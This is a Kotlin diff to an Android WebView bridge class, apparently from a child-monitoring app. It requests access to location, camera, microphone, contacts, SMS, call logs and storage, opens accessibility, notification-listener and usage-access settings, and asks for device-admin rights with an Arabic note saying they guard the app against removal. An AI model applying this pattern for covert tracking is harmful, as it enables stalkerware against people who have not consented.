@@ -46,50 +46,59 @@ class ChildWebInterface(private val mContext: Context) {
         }
     }
 
+    // طلب أذونات وقت التشغيل (تظهر نافذة منبثقة)
     @JavascriptInterface
-    fun requestPermission(type: String) {
+    fun requestRuntimePermission(type: String) {
+        var permission: String? = null
         when (type) {
-            "accessibility" -> mContext.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            "usage" -> mContext.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            "location" -> mContext.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            "overlay" -> mContext.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${mContext.packageName}")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            "notification" -> mContext.startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-            "admin" -> {
-                val devicePolicyManager = mContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val compName = ComponentName(mContext, MyDeviceAdminReceiver::class.java)
-                if (!devicePolicyManager.isAdminActive(compName)) {
-                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                    // الإصلاح هنا: إضافة as Parcelable
-                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName as Parcelable)
-                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق")
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    mContext.startActivity(intent)
-                }
-            }
-            "contacts" -> requestRuntimePermission(Manifest.permission.READ_CONTACTS)
-            "sms" -> requestRuntimePermission(Manifest.permission.READ_SMS)
-            "camera" -> requestRuntimePermission(Manifest.permission.CAMERA)
-            "microphone" -> requestRuntimePermission(Manifest.permission.RECORD_AUDIO)
+            "location" -> permission = Manifest.permission.ACCESS_FINE_LOCATION
+            "camera" -> permission = Manifest.permission.CAMERA
+            "microphone" -> permission = Manifest.permission.RECORD_AUDIO
+            "contacts" -> permission = Manifest.permission.READ_CONTACTS
+            "sms" -> permission = Manifest.permission.READ_SMS
+            "calls" -> permission = Manifest.permission.READ_CALL_LOG
             "storage" -> {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    requestRuntimePermission(Manifest.permission.READ_MEDIA_IMAGES)
-                } else {
-                    requestRuntimePermission(Manifest.permission.READ_EXTERNAL_STORAGE)
-                }
+                permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             }
         }
-    }
-    
-    private fun requestRuntimePermission(permission: String) {
-        if (mContext is MainActivity) {
-            if (ContextCompat.checkSelfPermission(mContext, permission) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(mContext, arrayOf(permission), 102)
+        
+        if (permission != null) {
+            if (mContext is MainActivity) {
+                if (ContextCompat.checkSelfPermission(mContext, permission) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(mContext, arrayOf(permission), 101)
+                }
             }
         }
     }
 
+    // طلب أذونات النظام العميقة (التوجه للإعدادات)
     @JavascriptInterface
-    fun startServices() { (mContext as MainActivity).startWorker() }
+    fun requestSpecialPermission(type: String) {
+        val intent: Intent? = when (type) {
+            "accessibility" -> Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            "overlay" -> Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${mContext.packageName}"))
+            "usage" -> Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+            "notification" -> Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+            "admin" -> {
+                val devicePolicyManager = mContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val compName = ComponentName(mContext, MyDeviceAdminReceiver::class.java)
+                if (!devicePolicyManager.isAdminActive(compName)) {
+                    val adminIntent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                    adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName as Parcelable)
+                    adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق من الإلغاء")
+                    mContext.startActivity(adminIntent)
+                }
+                return
+            }
+            else -> null
+        }
+        
+        intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        if (intent != null) mContext.startActivity(intent)
+    }
+
+    @JavascriptInterface
+    fun startServices() { /* Start background worker */ }
 
     private fun sendResult(js: String) { CoroutineScope(Dispatchers.Main).launch { (mContext as MainActivity).webView.evaluateJavascript(js, null) } }
 }
